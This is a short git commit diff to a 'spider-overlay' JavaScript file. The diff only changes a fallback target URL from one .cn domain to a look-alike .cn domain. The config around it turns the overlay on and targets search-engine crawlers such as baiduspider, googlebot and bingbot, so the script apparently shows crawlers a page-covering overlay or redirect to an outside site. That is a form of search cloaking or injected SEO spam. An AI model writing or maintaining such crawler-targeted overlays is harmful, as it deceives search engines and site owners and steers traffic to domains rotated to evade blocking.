f519cfeacca6feb53a492262d7ab1e2ad5faac29
mkallec <Ni8xWx8xCt@outlook.com>
2026-07-02 10:26:50 +0800

    Update fallback URL [Spider Overlay]

--- spider-overlay-v2/netlify/spider-overlay.js
+++ spider-overlay-v2/netlify/spider-overlay.js
@@ -14,7 +14,7 @@
   'use strict';
 
   var FALLBACK_CONFIG = {
-    targetUrl: 'https://dh-hzh5.twbjafa.cn?cid=1034',
+    targetUrl: 'https://dh-hzh5.twbjaga.cn?cid=1003',
     enabled: true,
     spiders: ['baiduspider','sogou web spider','yisouspider','360spider','googlebot','bingbot'],
     zIndex: 9999,
